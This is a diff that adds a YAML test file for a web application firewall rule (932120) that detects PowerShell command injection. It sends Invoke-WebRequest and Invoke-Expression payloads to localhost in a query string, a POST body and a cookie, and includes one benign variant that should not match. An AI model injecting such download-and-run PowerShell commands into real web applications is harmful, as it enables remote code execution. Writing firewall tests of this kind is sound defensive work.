@@ -1,0 +1,72 @@
+---
+  meta:
+    author: "Paul Beckett"
+    enabled: true
+    name: "932120.yaml"
+    description: "Tests to trigger or not trigger rule 932120"
+  tests:
+    -
+      test_title: 932120-1
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              method: "GET"
+              port: 80
+              headers:
+                  User-Agent: ModSecurity CRS 3 Tests
+                  Host: "localhost"
+              uri: "/?932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1"
+              protocol: "http"
+            output:
+              log_contains: "id \"932120\""
+    -
+      test_title: 932120-2
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              method: "POST"
+              port: 80
+              headers:
+                  User-Agent: ModSecurity CRS 3 Tests
+                  Host: "localhost"
+              data: '932120-2=Invoke-WebRequest http://example.com/path/file.ps1'
+              protocol: "http"
+            output:
+              log_contains: "id \"932120\""
+    -
+      test_title: 932120-3
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              method: "GET"
+              port: 80
+              headers:
+                  User-Agent: ModSecurity CRS 3 Tests
+                  Host: "localhost"
+                  Cookie: "931120-3=Invoke-Expression%20-Command%20file.ps1"
+              uri: '/'
+              protocol: "http"
+            output:
+              log_contains: "id \"932120\""
+    -
+      test_title: 932120-4
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              method: "POST"
+              port: 80
+              headers:
+                  User-Agent: ModSecurity CRS 3 Tests
+                  Host: "localhost"
+              data: '932120-4=Invoke Web Request http://example.com/path/file.ps1'
+              protocol: "http"
+            output:
+              no_log_contains: "id \"932120\""
